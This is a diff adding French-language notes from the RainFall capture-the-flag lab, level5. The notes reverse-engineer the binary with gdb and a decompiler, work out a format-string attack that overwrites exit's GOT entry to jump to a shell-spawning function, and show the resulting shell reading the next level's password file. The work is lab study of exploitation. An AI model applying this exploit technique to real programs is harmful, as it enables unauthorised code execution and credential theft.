@@ -2,3 +2,112 @@ level5@RainFall:~$ ./level5
 hey
 hey
 level5@RainFall:~$
+
+level5@RainFall:~$ gdb ./level5
+...
+(gdb) info functions
+All defined functions:
+...
+0x08048480  frame_dummy
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+...
+(gdb)
+
+ scp -P 4242 level5@192.168.1.51:/home/user/level5/level5 ../bin/.
+
+
+decompile on https://dogbolt.org/:
+void o(void)
+{
+  system("/bin/sh");
+                    // WARNING: Subroutine does not return
+  _exit(1);
+}
+
+void n(void)
+{
+  char local_20c [520];
+
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+                    // WARNING: Subroutine does not return
+  exit(1);
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+
+
+Le main appel la fonction n() mais la fonction o() elle n'est pas appelee
+il faut donc reussir a jump depuis n sur la fonction o
+MAIS la fonction n ne return pas elle exit !
+
+520 octets maxs de local_20c et 512 octets(0x200) fgets
+
+un shellcode ?
+pas possible sans eip
+
+(gdb) set disassembly-flavor intel
+(gdb) disassemble n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:     push   ebp
+   0x080484c3 <+1>:     mov    ebp,esp
+   0x080484c5 <+3>:     sub    esp,0x218
+   0x080484cb <+9>:     mov    eax,ds:0x8049848
+   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
+   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
+   0x080484dc <+26>:    lea    eax,[ebp-0x208]
+   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
+   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:    lea    eax,[ebp-0x208]
+   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
+   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
+   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
+End of assembler dump.
+(gdb) disassemble 0x80483d0
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:     jmp    DWORD PTR ds:0x8049838
+   0x080483d6 <+6>:     push   0x28
+   0x080483db <+11>:    jmp    0x8048370
+End of assembler dump.
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:       0x080483d6
+
+Je dois jump a la fonction 0x080484a4  o
+
+Donc mettre l'adress de la fonction o (0x080484a4) dans 0x8049838 
+pour que le jump soit effectuer au moment du exit
+
+0x080484a4
+
+4 adresse au debut surement 4 X 4 = 16 octets 
+3eme octet de l'adresse: 04 = 4
+4eme octet de l'adresse: 08 = 8
+2eme octet de l'adresse: 84 = 132
+1er octet de l'adresse: a4 = 164
+
+
+on est deja a 16 donc on monte a 256
+[256 + 4] = 260 % 256 = 4 et 260 - 16 = 244 (* a)
+[256 + 8] = 264 % 256 = 8 et 264 - 260 = 4 (* a)
+[256 + 132] = 388 % 256 = 132 et 388 - 264 = 124 (* a)
+[256 + 164] = 420 % 256 = 164 et 420 - 388 = 32 (* a)
+
+level5@RainFall:~$ echo "AAAA%x%x%x%x" - | ./level5
+AAAA200b7fd1ac0b7ff37d041414141 -
+
+donc %4
+
+level5@RainFall:~$ cat /tmp/payload - | ./level5
+cat /home/user/level6/.pass
+89:;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacat /home/user/level6/.pass
+ls
+ls: cannot open directory .: Permission denied
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
